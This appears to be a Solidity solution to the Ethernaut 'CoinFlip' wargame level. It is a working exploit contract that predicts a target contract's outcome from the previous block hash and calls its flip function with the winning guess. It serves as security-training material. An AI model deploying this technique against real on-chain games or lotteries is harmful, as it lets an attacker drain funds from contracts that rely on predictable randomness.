// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract FlipCoin {
    using SafeMath for uint256;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address coinFlipAddress = 0x81a27926Ca12B6A0F964455d5FBfF2425fCcb4DC;

    constructor() {}

    function flip() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        ICoinFlip(coinFlipAddress).flip(side);
    }
}
